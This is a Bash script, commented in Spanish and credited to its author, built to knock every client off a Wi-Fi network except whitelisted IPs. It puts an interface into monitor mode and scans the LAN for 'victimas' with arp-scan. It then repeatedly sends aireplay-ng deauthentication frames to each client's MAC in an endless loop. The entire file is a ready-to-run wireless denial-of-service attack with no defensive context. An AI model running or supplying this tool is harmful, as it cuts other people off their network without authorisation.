#!/bin/bash
# Script creado por SergiGM87
# Tiene la finalidad de hechar a todos los usuarios de una red Wifi a excepción de aquellos a los que se elija.
if [ -f ipNo.txt ]; then
rm ipNo.txt
fi
if [ -f ipSi.txt ]; then
rm ipSi.txt
fi
echo ""
echo "---------------------------------------------------------"
echo "4qql3"
echo "---------------------------------------------------------"
echo ""
echo "Indica tu interface de  red (SE USARÁ PARA MODO PROMISCUO):"
echo "---------------------------------------------------------"
ifconfig -s | awk '{print $1}' | grep -v Iface | grep -v lo | grep .
echo "---------------------------------------------------------"
read interface
echo ""
echo "Iniciar $interface modo promiscuo? SI (s) NO (n)"
echo "---------------------------------------------------------"
read prom
if [ "$prom" = "s" ]; then
airmon-ng start $interface
fi
while :; do
echo ""
echo "Indica si quieres añadir alguna otra IP a la que no quieras"
echo "afectar con el ataque: (ENTER para dejarlo vacio)"
echo "---------------------------------------------------------"
read ip
if [ "$ip" = "" ] || [ "$ip" = "n" ]; then
break;
fi
echo "$ip" >> ipNo.txt
echo ""
echo "Alguna otra? SI (s) NO (n)"
echo "---------------------------------------------------------"
read otraip
if [ "$otraip" = "n" ] || [ "$otraip" = "" ]; then
break
fi
done
echo ""
echo "INICIANDO ATAQUE"
echo "---------------------------------------------------------"
while :; do
echo ""
echo "Buscando victimas"
echo "---------------------------------------------------------"
arp-scan -l > arp-scan.txt
cp arp-scan.txt ipSi.txt
cat ipSi.txt
gw=$(route -n | grep UG | awk '{print $2}')
cat ipSi.txt | grep -v "$gw" | grep -v "received" | awk '{print $1}' | grep -v "Interface" | grep -v "Starting" | grep -v "Ending" | grep . > victimas.txt
cat victimas.txt | grep -v "$gw" > ipSi.txt
rm victimas.txt
echo "---------------------------------------------------------"
ifconfig | grep -A 1 $interface | grep "Direc. inet:" | awk -F ':' '{print $2}' | awk '{print $1}' >> ipNo.txt
cat ipSi.txt | sort | uniq | grep $(echo "$gw" | awk -F '.' '{print $1"."$2}') | grep . > ipS.txt
rm ipSi.txt
linea=$(cat ipNo.txt | wc -l | sed 's/ //g')
count="1"
for a in $(seq 1 $linea); do
if [ "$count" = "" ]; then
cat ipSi.txt | grep -v $(cat ipNo.txt | sed -n "$a"p) >> ipS.txt
rm ipSi.txt
count="1"
else
cat ipS.txt | grep -v $(cat ipNo.txt | sed -n "$a"p) >> ipSi.txt
rm ipS.txt
count=""
fi
done
if [ -f ipS.txt ]; then
mv ipS.txt ipSi.txt
fi
lineas=$(cat ipSi.txt | wc -l)
Hmac=$(iwlist $interface scanning | grep "Address:" | awk -F 'Address:' '{print $2}' | sed 's/ //g')
for a in $(seq 1 $lineas); do
Vmac=$(cat arp-scan.txt | grep $(cat ipSi.txt | sed -n "$a"p) | awk '{print $2}' | grep -v "$gw")
gate=$(cat arp-scan.txt | grep "$Vmac" | awk '{print $1}')
if [ "$gate" = "$gw" ] || [ "$gate" = "" ] || [ "$Vmac" = "$gw" ]; then
sleep 10
else
echo "$gate = $Vmac"
echo "$gw = $Hmac"
aireplay-ng -0 3 -c "$Vmac" -a "$Hmac" -D $interface"mon0"
fi
echo ""
done
done
